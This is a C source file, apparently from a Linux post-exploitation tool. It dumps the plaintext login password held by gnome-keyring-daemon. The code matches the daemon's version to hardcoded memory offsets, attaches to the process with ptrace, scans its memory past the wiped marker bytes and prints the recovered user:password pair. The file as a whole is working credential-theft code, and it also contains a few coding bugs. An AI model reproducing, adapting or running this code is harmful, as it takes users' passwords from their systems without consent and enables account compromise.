#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/types.h>

#include "gnomeKeyring.h"
#include "util.h"

// Supported versions and egg pointers
GnomeKeyringTarget g_gnomeKeyringTargets[] = {
    {
        "3.18.3",
        (void*)0x6f7158,
        0
    },
    {
    "3.28.0.2",
    (void*)0x30abc0,
    1
    }
};

GnomeKeyringTarget *getGnomeKeyringTarget()
{
    FILE *fp;
    GnomeKeyringTarget *ret = NULL;
    size_t size = 0;
    char *line = NULL, *version = NULL;

    if ( (fp = popen(GNOME_CMD, "r")) == NULL )
    {
        printf("[!] ERROR: Failed to run %s - %s\n", GNOME_CMD, strerror(errno));
        goto CLEANUP;;
    }

    if ( getline(&line, &size, fp) < 0 )
    {
        printf("[!] ERROR: Failed to read output from %s - %s\n", GNOME_CMD, strerror(errno));
        goto CLEANUP;;
    }
    
    if ( (version = strstr(line, " ")) == NULL )
    {
        printf("[!] ERROR: Unexpected output from %s - %s\n", GNOME_CMD, strerror(errno));
    }

    version += 1; // skip space
    if ( (version = strtok(version, "\n")) == NULL ) //strip new line
    {
        printf("[!] ERROR: Failed to strip newline - %s\n", strerror(errno));
    }

    for (int i=0; i < sizeof(g_gnomeKeyringTargets)/sizeof(GnomeKeyringTarget); i++)
    {
        if ( !strcmp(g_gnomeKeyringTargets[i].version, version) )
        {
            ret = &g_gnomeKeyringTargets[i];
            goto CLEANUP;
        }
    }

    CLEANUP:
        if ( fp != NULL )
            fclose(fp);
        if ( line != NULL )
                free(line);
        return ret;    
}

int gnomeKeyringDump(int pid)
{
    GnomeKeyringTarget *target = NULL;
    char passwd[MAX_PASSWD] = {0}, *user = NULL;
    unsigned long chunk = 0;
    unsigned long eggAddr = 0;
    unsigned long *egg;
    unsigned long marker = 0;
    unsigned long base = 0;
    int status = -1, loopNum=0;
    int passwdDone = 0;
    int cur = 0;
    char *sysVersion = NULL;
    void *eggPtr = NULL;

    if ( (user = getUser(pid)) == NULL )
    {
        printf("  [!] Error getting user for pid\n");
    }

    if ( !strcmp(user, "lightdm") )
        return 1; // Skip this one to avoid crash

    
    printf("[+] GNOME KEYRING (%d)\n", pid);
    if ( (target = getGnomeKeyringTarget()) == NULL )
    {
        printf("  [-] gnome-keyring-daemon version not supported\n");
        return 1;
    }

    eggPtr = target->eggPtrAddr;

    if ( ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0 )
    {
        printf("  [!] ERROR: Ptrace attach failed - %s\n", strerror(errno));
        return -1;
    }

    wait(&status);
    if ( WIFSTOPPED(status) )
    {
        if ( target->pieFlag ) // target is pie, egg is relative to base
        {
            if ( (base = getBaseAddr(pid)) == 0 )
            {
                printf("  [!] ERROR: Failed to get image base ofr %d\n", pid);
                return -1;
            }
            eggPtr += base;
        }

        if ( (eggAddr = ptrace(PTRACE_PEEKDATA, pid, (void*)eggPtr, NULL)) < 0 )
        {
            printf(" [!] ERROR: Ptrace peek 1 failed - %s\n", strerror(errno));
            return -1;
        }

        while (1)
        {
            if (loopNum == 4) // loopMax = 4
            {
                printf("  [!] ERROR: Cannot find marker for egg region\n");
                return -1;
            }

            marker = 0;
            if ( (marker = ptrace(PTRACE_PEEKDATA, pid, (void*)eggAddr, NULL)) < 0)
            {
                printf("  [!] ERROR: Ptrace peek marker failed - %s\n", strerror(errno));
                return -1;
            }
            if ( ((marker & 0xff) != 0xaa) && ((marker & 0xff) != 0x00) )
            {
                eggAddr += sizeof(long)*2; // Password starts 2 words after the last "secure wiped" word
                break;
            }
            eggAddr += sizeof(long);
            loopNum += 1;
        }

        loopNum = 0;
        while (!passwdDone)
        {
            if (loopNum == ((MAX_PASSWD-1) / sizeof(long)) )
            {
                printf("  [!] ERROR: Cannot find password\n");
                return 1;
            }
            chunk = 0;
            eggAddr += cur;
  
            if ( (chunk = ptrace(PTRACE_PEEKDATA, pid, (void*)eggAddr, NULL)) < 0)
            {
                printf("  [!] ERROR: Ptrace peek 2 failed - %s\n", strerror(errno));
                return -1;
            }
            memcpy(passwd+cur, &chunk, sizeof(long));
            for (int i=0; i < cur; i++)
            {
                if (passwd[i] == '\0')
                    passwdDone = 1;
            }
            cur += sizeof(long);
            loopNum += 1;
        }
        if ( ptrace(PTRACE_DETACH, pid, NULL, NULL) < 0 )
        {
            printf(" [!] ERROR: Ptrace attach failed\n");
            return -1;
        }
    }

    if (passwd)
    {
        printf("  [-] %s:%s\n", user, passwd);
        return 0;
    }
    else
    {
        return -1;
    }
}

